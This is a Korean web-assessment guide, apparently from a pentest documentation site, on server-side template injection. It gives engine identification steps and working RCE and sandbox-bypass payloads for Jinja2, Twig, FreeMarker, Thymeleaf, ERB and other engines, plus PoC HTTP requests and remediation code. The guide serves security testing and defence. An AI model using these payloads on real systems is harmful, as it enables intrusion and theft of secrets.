---
sidebar_position: 21
title: 서버 사이드 템플릿 인젝션 (SSTI)
description: 웹 진단 - SSTI 점검 절차, 엔진별 페이로드 (Jinja2/Twig/FreeMarker/Thymeleaf/ERB), 샌드박스 우회, PoC 양식
keywords: [SSTI, Server-Side Template Injection, Jinja2, Twig, FreeMarker, Thymeleaf, ERB, Sandbox Escape, OWASP A05, RCE]
draft: false
---

# 서버 사이드 템플릿 인젝션 (Server-Side Template Injection, SSTI)

> 사용자 입력이 **템플릿 엔진의 렌더링 컨텍스트** 에 그대로 삽입되어, 표현식으로 해석되는 취약점.
> 단순 XSS 와 달리 대부분 **RCE 로 직결** 되며, 단일 결함만으로 시스템 침해 등급.

## 점검 개요

| 항목 | 내용 |
| :--- | :--- |
| **분류** | OWASP A05:2025 - Injection / KISA 입력 데이터 검증 |
| **CWE** | [CWE-1336: Template Engine](https://cwe.mitre.org/data/definitions/1336.html), [CWE-94: Code Injection](https://cwe.mitre.org/data/definitions/94.html), [CWE-95: Eval Injection](https://cwe.mitre.org/data/definitions/95.html) |
| **영향도** | 🔴 매우 높음 (대부분 RCE) / 🟡 (산술식만 평가되고 객체 접근 불가) |
| **점검 난이도** | 중 (탐지) / 상 (엔진 식별 후 RCE 체인·샌드박스 우회) |
| **예상 점검 시간** | 1 ~ 4시간 (엔진 식별 후 페이로드 적용은 빠름) |

---

## 점검 목적

사용자 입력이 응답에 그대로 출력되는 지점 중, **그 출력이 템플릿 엔진의 렌더링 결과로 평가되는지** 를 확인한다. 단순 출력 (XSS 영역) 과 달리, 입력값이 템플릿 표현식으로 해석되면 거의 모든 케이스에서 RCE 로 이어지므로 발견 즉시 Critical 등급.

> **다른 페이지와 영역 분리**
> - 클라이언트 측 템플릿 인젝션 (CSTI: AngularJS 표현식 등) → `xss.md` 참고
> - `eval()` / `exec()` 등 템플릿 엔진과 무관한 코드 인젝션 → 별개 (command-injection.md 와도 다름)
> - DOM 출력만 되고 표현식 평가가 안 되면 → SSTI 가 아니라 XSS 점검으로 전환

---

## 유형 구분

| 유형 | 핵심 |
| :--- | :--- |
| **표현식 평가만 가능** | `{{7*7}}` 은 49 가 되지만, 객체/메서드 접근은 막혀 있음 → 정보 노출 등급에서 멈춤 |
| **객체 그래프 → RCE** | 가장 흔한 패턴. 엔진 내부 객체(`__class__`, `_self.env`, `T(...)`) 통해 OS 명령 실행 |
| **샌드박스 우회** | Jinja2 `SandboxedEnvironment`, Twig sandbox 등 활성 환경에서 우회 페이로드 사용 |
| **환경/설정 노출만** | `{{ config }}`, `{{ dump(app) }}` 등으로 비밀키·DB 자격증명 등 노출 (RCE 안 되어도 High) |

---

## 진단 절차

### Step 1. 진입점 식별

사용자 입력이 응답에 출력되는 지점 중, **그 출력이 템플릿 렌더링 결과인지** 확인. 흔한 위치:

- 이름/닉네임 (`Hello, <NAME>!`)
- 에러 메시지 (`사용자 <USER> 를 찾을 수 없습니다`)
- 이메일/알림 템플릿 본문
- 관리자 페이지의 동적 콘텐츠 (위젯, 페이지 빌더, CMS)
- URL 경로 자체를 뷰 이름으로 쓰는 케이스 (Thymeleaf 등)

XSS 와 헷갈리기 쉬운데, 출력 위치가 정적 HTML 슬롯이 아니라 **서버에서 템플릿 엔진을 다시 한 번 거치는 경로** 인지가 핵심.

### Step 2. 엔진 비특정 탐지

엔진을 모르는 상태에서 **polyglot fuzz string** 으로 에러 또는 응답 변화 유발:

```
${{<%[%'"}}%\.
```

응답에 에러 메시지/스택트레이스가 떨어지면 엔진 단서가 보이는 경우가 많음 (`jinja2.exceptions.TemplateSyntaxError`, `Twig\Error\Syntax`, `freemarker.core.ParseException` 등).

### Step 3. 표현식 평가 확인

엔진별 표준 표현식 구문을 모두 한 번씩 시도해서 산술식이 평가되는지 확인:

```
{{7*7}}        ← Jinja2 / Twig / Liquid / Nunjucks
${7*7}         ← FreeMarker / Thymeleaf / JSP EL
<%= 7*7 %>     ← ERB / EJS / JSP scriptlet
#{7*7}         ← Pug / Razor
${{7*7}}       ← Handlebars 변종
```

응답에 `49` 가 보이면 그 구문을 사용하는 엔진에 SSTI 가능성. `7*7` 그대로 출력되면 템플릿 평가가 아니라 단순 출력 (XSS 영역).

### Step 4. 엔진 정확 식별 (분기)

같은 `{{ }}` 구문을 쓰는 엔진들도 동작이 미세하게 다름. 다음 표로 좁힘:

| 페이로드 | Jinja2 (Python) | Twig (PHP) | FreeMarker (Java) | Thymeleaf | ERB (Ruby) |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `{{7*7}}` | 49 | 49 | (미반응) | (미반응) | (미반응) |
| `{{7*'7'}}` | `7777777` | `49` | 에러 | (미반응) | (미반응) |
| `${7*7}` | (미반응) | (미반응) | `49` | `49` | (미반응) |
| `<%= 7*7 %>` | (미반응) | (미반응) | (미반응) | (미반응) | `49` |
| `{{ self }}` | 객체 repr | 변수 미정의 | - | - | - |

이 단계에서 엔진을 거의 확정한 뒤, 케이스 2~6 의 엔진별 페이로드로 넘어감.

### Step 5. RCE 체인 + 영향 입증

엔진별 RCE 페이로드로 단순 `id` 또는 `whoami` 실행 결과를 응답으로 가져오면 영향 입증 완료. 보고서에는 명령 결과만 첨부하고 그 이상 (실제 파일 변조, 권한 상승) 은 사전 협의 범위 내에서만.

---

## 페이로드 / 테스트 케이스

### 케이스 1: 엔진 비특정 탐지

**언제 쓰는지**: 처음 진입점을 발견했고 엔진을 모를 때. 가장 먼저 던지는 페이로드 세트.

**페이로드:**

```
${{<%[%'"}}%\.       ← 에러 유도로 엔진 단서 확보
{{7*7}}              ← 49 또는 그대로 출력 확인
{{7*'7'}}            ← Jinja2 vs Twig 분기용
${7*7}               ← FreeMarker / Thymeleaf 분기용
<%= 7*7 %>           ← ERB 분기용
```

**판정**:
- 응답 어딘가에 `49` 또는 `7777777` 등 평가 결과가 출력되면 SSTI 거의 확정.
- 페이로드 그대로 (예: `{{7*7}}`) 가 응답에 들어가 있으면 평가는 안 되지만 **출력은 됨** → XSS 점검으로 전환.
- 에러 메시지에 엔진 이름이 그대로 노출되면 Step 4 스킵하고 바로 케이스 2~6 으로.

### 케이스 2: Jinja2 (Python / Flask) — 실무에서 가장 흔함

**언제 쓰는지**: Step 4 에서 `{{7*'7'}}` → `7777777` 로 Jinja2 확정. Flask 기반 서비스에서 가장 많이 발견됨.

**2-1. 환경 / 설정 노출 (RCE 전 정보 수집):**

```
{{ config }}                       ← Flask config 객체 — SECRET_KEY, DB URI 노출
{{ config.items() }}
{{ self.__dict__ }}
{{ request.environ }}              ← 환경 변수
```

**판정**: `SECRET_KEY`, `SQLALCHEMY_DATABASE_URI` 등이 응답에 노출되면 그 자체로 High 등급. RCE 안 되어도 보고 대상.

**2-2. 표준 RCE 체인 (Popen 탐색):**

```
1. 모든 서브클래스 나열:
   {{ ''.__class__.__mro__[1].__subclasses__() }}

2. 응답에서 subprocess.Popen 의 인덱스 N 찾기 (Python 버전마다 다름)

3. RCE:
   {{ ''.__class__.__mro__[1].__subclasses__()[N]('id', shell=True, stdout=-1).communicate() }}
```

**판정**: `(b'uid=0(root) gid=0(root)...', None)` 같은 응답이 보이면 RCE 확정.

**2-3. SandboxedEnvironment 환경에서의 우회:**

`__class__` / `__subclasses__` 등이 차단된 경우 `request` 객체 경유:

```
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

또는 `|attr()` 필터로 점 표기 우회:

```
{{ ''|attr('__cla'+'ss__')|attr('__mro__')|attr('__getitem__')(1) }}
```

**판정**: 위 페이로드 중 하나로 명령 결과가 응답에 나오면 샌드박스 우회 성공.

### 케이스 3: Twig (PHP / Symfony)

**언제 쓰는지**: Step 4 에서 `{{7*'7'}}` → `49`, 응답 헤더/에러에 PHP / Symfony 단서.

**3-1. 정보 노출:**

```
{{ dump(app) }}                    ← Symfony Application 객체 전체 dump
{{ app.request.server.all|join(',') }}   ← 환경 변수
```

**3-2. RCE — `registerUndefinedFilterCallback`:**

```
{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("whoami") }}
```

**판정**: 응답에 명령 실행 결과 (`uid=...`) 가 보이면 취약. Symfony sandbox 가 활성화된 환경에서는 `_self` 접근이 차단되므로 안 통할 수 있음 — 다음 변형 시도:

```
{{ ['id', null]|sort('system') }}
{{ ['id']|filter('system') }}
```

### 케이스 4: FreeMarker (Java / Spring)

**언제 쓰는지**: `${7*7}` → `49`, 응답에 Java / Spring 흔적 (`Whitelabel Error`, `freemarker.*` 에러).

**4-1. RCE — Execute 유틸리티:**

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

대괄호 구문 환경 (`square_bracket_interpolation`) 인 경우:

```
[#assign ex='freemarker.template.utility.Execute'?new()]${ ex('id')}
```

**판정**: 응답에 `id` 명령 결과가 그대로 보이면 취약.

> FreeMarker 2.3.30 이상 + `TemplateClassResolver.SAFER_RESOLVER` 또는 `ALLOWS_NOTHING_RESOLVER` 가 적용된 환경에서는 `?new()` 가 막힘. 이 경우 신버전 + 안전 설정으로 판정 (취약 아님). 구버전이거나 resolver 가 기본값이면 거의 확정 취약.

### 케이스 5: Thymeleaf (Java / Spring) — 발생 조건이 좁음

**언제 쓰는지**: Spring Boot + Thymeleaf 환경에서 **뷰 이름 / URL fragment 가 사용자 입력으로 결정되는 경우**. 일반 변수 출력 (`<span th:text="${name}">`) 에서는 발생하지 않음 — 이건 자동 이스케이프됨.

**5-1. 표현식 평가 트리거 (뷰 이름 인젝션):**

```
GET /page/__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x HTTP/1.1

또는:
GET /page/__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
```

**판정**: 응답 본문 또는 에러 페이지에 `id` 결과가 보이면 취약. SpEL (Spring Expression Language) 평가가 그대로 일어남.

> 점검 시 우선순위는 낮음 — 발생 조건이 매우 좁음. 다만 발견되면 임팩트는 RCE 라 High.

### 케이스 6: ERB (Ruby / Rails)

**언제 쓰는지**: `<%= 7*7 %>` → `49`. Rails 의 ActionView 동적 렌더링이 사용자 입력을 받는 드문 케이스.

**페이로드:**

```ruby
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= File.open('/etc/passwd').read %>
```

**판정**: `uid=...` 가 응답에 출력되면 취약. Rails 에서는 거의 발견되지 않지만, ERB 를 직접 `ERB.new(user_input).result` 형태로 부르는 코드가 있으면 그대로 취약.

### 케이스 7: 샌드박스 / 필터 우회 패턴

**언제 쓰는지**: 케이스 2~6 의 표준 페이로드가 막혀 있지만, 산술식은 평가될 때 (= 엔진은 동작 중이고 키워드 필터만 있는 경우).

**Jinja2 키워드 필터 우회:**

```
{{ '__cla'+'ss__' }}                ← 문자열 분할
{{ ''['__cla''ss__'] }}              ← 따옴표 우회
{{ ''|attr('__cla'+'ss__') }}        ← attr 필터로 점 표기 회피
{{ request.__init__.__globals__ }}   ← request 경유
```

**공백/특수문자 우회:**

```
{{''.__class__.__mro__[1].__subclasses__()[N]('id',shell=True,stdout=-1).communicate()}}
```

(공백 제거. 필요 시 `\x20` 인코딩, 주석 `{# #}` 분리 등)

**판정**: 위 변형 중 하나로 RCE 가 성공하면 샌드박스/필터가 우회된 것 — 취약.

### 그 외 — 한 줄 언급만 (실무 빈도 낮음)

발견 시 PayloadsAllTheThings 의 해당 항목으로 점프.

- **Velocity (Java)** — `#set($x='')+$x.class.forName('java.lang.Runtime').getRuntime().exec('id')`
- **Smarty (PHP)** — ``{php}echo `id`;{/php}`` (3.1 미만), 최신 버전은 `{php}` 차단됨
- **Mako (Python)** — `<% import os; x=os.popen('id').read() %>${x}`
- **Tornado (Python)** — `{% import os %}{{os.system('id')}}`
- **Pug (Node.js)** — `#{global.process.mainModule.require('child_process').execSync('id')}`
- **Handlebars (Node.js)** — 기본 환경에선 표현식 제한적, `lookup` helper 악용 케이스 존재
- **CSTI (AngularJS `{{ }}`)** — DOM 측 표현식. SSTI 아님 → `xss.md` 참고
- **tplmap** — 자동 탐지/익스플로잇 도구. 페이로드를 수동으로 던지는 게 진단 기본이고, tplmap 은 보조 (특히 Jinja2 미지원 버전이 많아 의존 비추)

---

## 취약 판정 기준

다음 중 **하나라도** 해당하면 취약:

- [ ] `{{7*7}}` / `${7*7}` / `<%= 7*7 %>` 류 입력이 **`49` 로 평가되어 응답에 출력**
- [ ] 엔진 객체 그래프 (`__class__`, `_self.env`, `T(...)`, `?new()`) 탐색이 응답에 반영됨
- [ ] OS 명령 실행 결과 (`id`, `whoami`, `uid=...`) 가 응답에 반환됨
- [ ] 환경 / 설정 (`{{ config }}`, `{{ dump(app) }}`) 으로 `SECRET_KEY`, DB 자격증명 등 노출
- [ ] 샌드박스가 활성이지만 우회 페이로드로 RCE 성공

**오탐 주의:**

- [ ] 입력이 응답에 그대로 출력되지만 산술식이 평가되지 않으면 SSTI 아님 → XSS 점검으로 전환
- [ ] Thymeleaf `th:text="${name}"` 변수 출력에서 `${7*7}` 이 그대로 나오면 정상 (자동 이스케이프) — 취약 아님
- [ ] FreeMarker 2.3.30+ + Safer Resolver 환경에서 `?new()` 실패는 정상 (안전 설정이 적용된 상태)
- [ ] 응답에 `49` 가 보여도 그게 우연히 입력의 일부거나, 다른 비즈니스 로직 결과일 수 있음 — `{{8*8}}` → `64`, `{{9*9}}` → `81` 로 교차 검증

---

## PoC 양식 (보고서 붙여넣기용)

### PoC 1 — [SSTI] Jinja2 표현식 인젝션을 통한 원격 명령 실행

1. `<TARGET>` 의 닉네임 변경 기능 또는 인사말 출력 페이지의 `name` 파라미터에 페이로드 입력
2. 응답에 표현식 평가 결과 (`49`) 가 출력되는 것을 확인 (1차 탐지)
3. Jinja2 객체 그래프를 통해 `subprocess.Popen` 인덱스 식별 후 `id` 명령 실행
4. 응답 본문에 `uid=33(www-data) gid=33(www-data)` 가 그대로 출력됨

**1차 탐지 — 표현식 평가 확인:**

```http
GET /hello?name=%7B%7B7*'7'%7D%7D HTTP/1.1
Host: <TARGET>
Cookie: SESSION=<session>
```

**응답:**

```http
HTTP/1.1 200 OK
Content-Type: text/html

<h1>Hello, 7777777!</h1>
```

→ `{{7*'7'}}` 이 `7777777` 로 평가됨 = Jinja2 확정.

**2차 — RCE:**

```http
GET /hello?name=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__()%5B398%5D(%27id%27%2Cshell%3DTrue%2Cstdout%3D-1).communicate()%20%7D%7D HTTP/1.1
Host: <TARGET>
Cookie: SESSION=<session>
```

(URL 디코딩하면: `{{ ''.__class__.__mro__[1].__subclasses__()[398]('id',shell=True,stdout=-1).communicate() }}`)

**응답 — 취약 발현 증거:**

```http
HTTP/1.1 200 OK
Content-Type: text/html

<h1>Hello, (b'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n', None)!</h1>
```

**확인 사항:**
- `name` 파라미터의 값이 서버 측 Jinja2 템플릿 엔진에서 평가됨
- 객체 그래프를 통해 `subprocess.Popen` 에 접근 가능 → 임의 OS 명령 실행
- `www-data` 권한이지만, 컨테이너 환경의 경우 내부 네트워크 피벗 및 자격증명 탈취 가능 (별첨)
- 단일 결함만으로 시스템 침해 등급 = Critical

---

### PoC 2 — [SSTI] Twig 정보 노출 → registerUndefinedFilterCallback 을 통한 RCE

1. `<TARGET>` 의 페이지 빌더 / 동적 위젯 본문에 페이로드 입력
2. `{{ dump(app) }}` 로 Symfony Application 객체 노출 확인 (1차 정보 노출 등급)
3. `_self.env.registerUndefinedFilterCallback("system")` 를 통한 명령 실행 (Critical)

**1차 — 정보 노출:**

```http
POST /widgets/preview HTTP/1.1
Host: <TARGET>
Content-Type: application/json
Cookie: SESSION=<admin_session>

{"content": "{{ dump(app) }}"}
```

**응답 (일부):**

```http
HTTP/1.1 200 OK
Content-Type: text/html

Symfony\Component\HttpKernel\Kernel { ... 
  "secret": "s3cr3tK3y_changeme",
  "database_url": "mysql://root:p@ssw0rd@db:3306/app",
  ...
}
```

→ Twig 확정 + 비밀키 / DB 자격증명 노출.

**2차 — RCE:**

```http
POST /widgets/preview HTTP/1.1
Host: <TARGET>
Content-Type: application/json
Cookie: SESSION=<admin_session>

{"content": "{{ _self.env.registerUndefinedFilterCallback(\"system\") }}{{ _self.env.getFilter(\"id\") }}"}
```

**응답:**

```http
HTTP/1.1 200 OK
Content-Type: text/html

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**확인 사항:**
- `content` 필드 값이 Twig 엔진에서 그대로 렌더링됨
- Symfony sandbox 가 비활성 상태로, `_self.env` 접근 가능
- `registerUndefinedFilterCallback` 으로 임의의 PHP 함수 호출 → 임의 OS 명령 실행
- 페이지 빌더 권한이 일반 관리자에게 부여되어 있어 관리자 단위 RCE 가능

---

## 영향도 분석

- **기밀성 (Confidentiality)**: 🔴 **매우 높음** — RCE 시 파일/DB 자격증명/세션 토큰 전체 노출
- **무결성 (Integrity)**: 🔴 **매우 높음** — 임의 파일 변조, DB 직접 조작, 백도어 설치
- **가용성 (Availability)**: 🔴 — 시스템 정지, 데이터 삭제, 컨테이너/호스트 장악
- **추가 위협**:
  - **내부 네트워크 피벗** — RCE 후 인접 서비스로 횡적 이동
  - **클라우드 자격증명 탈취** — IMDS 호출로 EC2/ECS Role 자격증명 획득 (`ssrf.md` 의 시나리오와 결합)
  - **CI/CD 침해** — 빌드 서버 / 배포 컨테이너에 SSTI 가 있으면 공급망 침해까지 직결
  - **정보 노출만으로도 High** — `{{ config }}` / `{{ dump(app) }}` 으로 `SECRET_KEY` 노출 시 JWT 위조 등 연계

**비즈니스 임팩트:**
SSTI 는 발견 빈도는 다른 인젝션보다 낮지만, 발견되면 거의 모든 경우 RCE 로 직결되어 **단일 결함만으로 시스템 침해 등급**. 특히 페이지 빌더 / CMS / 이메일 템플릿 / 동적 위젯 등 사용자 입력이 템플릿 본문으로 들어가는 기능은 점검 우선순위 최상위로 분류해야 함.

---

## 대응방안

### 개발자 관점 (필수)

1. **사용자 입력은 변수로만 전달, 절대 템플릿 문자열에 concat 금지** — 가장 흔한 안티패턴:

   ```python
   # 위험 — 사용자 입력이 템플릿 본문이 됨 (SSTI 그 자체)
   render_template_string(f"Hello, {user_input}!")

   # 안전 — 입력은 변수로만
   render_template_string("Hello, {{ name }}!", name=user_input)
   ```

2. **샌드박스 환경 사용** — 사용자가 템플릿 본문을 작성해야만 하는 경우 (CMS, 이메일 템플릿 등):
   - **Jinja2**: `SandboxedEnvironment` (단, 우회 사례 존재 — 케이스 2-3 참조. 신뢰 입력이 아니면 절대 사용 금지)
   - **Twig**: `SandboxExtension` + 허용 태그/필터/함수 화이트리스트
   - **FreeMarker**: `TemplateClassResolver.SAFER_RESOLVER` 또는 `ALLOWS_NOTHING_RESOLVER` + `new_builtin_class_resolver`
   - **Velocity**: `SecureUberspector`

3. **로직 없는 템플릿 엔진 사용 고려** — 가능하면 튜링 완전성을 가진 엔진 대신:
   - Mustache, Handlebars (기본 모드), MJML 등 — 변수 치환만 지원
   - SSTI 가 발생해도 RCE 로 이어지지 않음

4. **입력 검증 / 이스케이프는 1차 방어책이 아님** — SSTI 는 이미 템플릿 컨텍스트에서 평가되므로, HTML 이스케이프 (`<` → `&lt;`) 로는 막을 수 없음. **구조적 분리** (1번) 가 본질.

5. **에러 메시지 / 디버그 페이지 비공개** — Flask `DEBUG=False`, Symfony `APP_ENV=prod`, Spring Boot Whitelabel Error Page 비활성. 에러로 엔진 정보가 노출되면 공격 난이도가 급감.

### 운영자 관점

1. **WAF 룰 — 보조 수단** — `__class__`, `_self.env`, `?new()`, `{{` `}}` 등 키워드 차단 룰. 우회 변형이 많아 단독 의존은 금지.

2. **컨테이너 격리 + 최소 권한** — 웹 워커는 `www-data` 비특권 사용자 + 컨테이너 격리 + IMDS v2 + 네트워크 정책. RCE 가 터져도 피해 면 축소.

3. **모니터링** — 응답 본문에 OS 명령 출력 (`uid=`) 또는 환경 변수 패턴 (`/etc/passwd`) 이 포함된 응답 탐지/알람.

### 안전 / 위험 코드 비교 (스택별)

**Flask (Jinja2):**

```python
# 위험 1 — 사용자 입력이 템플릿 본문이 됨
@app.route('/hello')
def hello():
    name = request.args.get('name', '')
    return render_template_string(f"<h1>Hello, {name}!</h1>")    # SSTI

# 위험 2 — 사용자가 작성한 템플릿을 그대로 렌더링
@app.route('/preview', methods=['POST'])
def preview():
    return render_template_string(request.form['template'])     # SSTI

# 안전 — 변수로만 전달
@app.route('/hello')
def hello():
    name = request.args.get('name', '')
    return render_template_string("<h1>Hello, {{ name }}!</h1>", name=name)

# 사용자 템플릿을 정 받아야 한다면 SandboxedEnvironment (그래도 위험 — 우회 사례 있음)
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
# 가능하면 Mustache/Handlebars 등 로직 없는 엔진으로 전환 권장
```

**Symfony (Twig):**

```php
// 위험 — 사용자 입력으로 Twig 템플릿 생성
$template = $twig->createTemplate($request->get('content'));   // SSTI
echo $template->render([]);

// 안전 — 변수로만 전달
echo $twig->render('hello.html.twig', [
    'name' => $request->get('name'),     // 자동 이스케이프
]);

// 사용자가 템플릿을 작성해야 한다면 sandbox + 화이트리스트
use Twig\Extension\SandboxExtension;
use Twig\Sandbox\SecurityPolicy;

$policy = new SecurityPolicy(
    tags: ['if', 'for'],
    filters: ['escape', 'upper', 'lower'],
    methods: [],
    properties: [],
    functions: []
);
$twig->addExtension(new SandboxExtension($policy, true));
```

**Spring Boot (Thymeleaf):**

```java
// 위험 — 사용자 입력이 뷰 이름 결정
@GetMapping("/page/{name}")
public String page(@PathVariable String name) {
    return name;        // ← 뷰 이름 자체가 사용자 입력 → SpEL 평가 가능 SSTI
}

// 안전 — 뷰 이름은 서버에서 고정, 사용자 입력은 모델로
@GetMapping("/page/{name}")
public String page(@PathVariable String name, Model model) {
    model.addAttribute("name", name);    // 변수로만 전달 (자동 이스케이프)
    return "page";                        // 뷰 이름은 고정
}
```

**FreeMarker (Spring):**

```java
// 위험 — 기본 ObjectWrapper + 사용자 입력이 템플릿 본문
Template t = new Template("x", new StringReader(userInput), cfg);
t.process(data, out);     // SSTI + ?new() 로 RCE

// 안전 — Safer resolver 적용 + 사용자 입력은 데이터 모델에만
Configuration cfg = new Configuration(Configuration.VERSION_2_3_31);
cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
// 또는 SAFER_RESOLVER (꼭 필요한 클래스만)
// 사용자 입력은 data 맵의 값으로만 전달, 템플릿 본문은 정적 파일
```

---

## 참고자료

- [OWASP Testing Guide - Testing for Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)
- [PortSwigger - Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
- [PortSwigger - Exploiting SSTI to achieve remote code execution](https://portswigger.net/web-security/server-side-template-injection/exploiting)
- [PayloadsAllTheThings - Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [HackTricks - SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [Cobalt - A Pentester's Guide to Server-Side Template Injection](https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)
- [James Kettle - Server-Side Template Injection: RCE for the Modern Web App (BlackHat 2015)](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
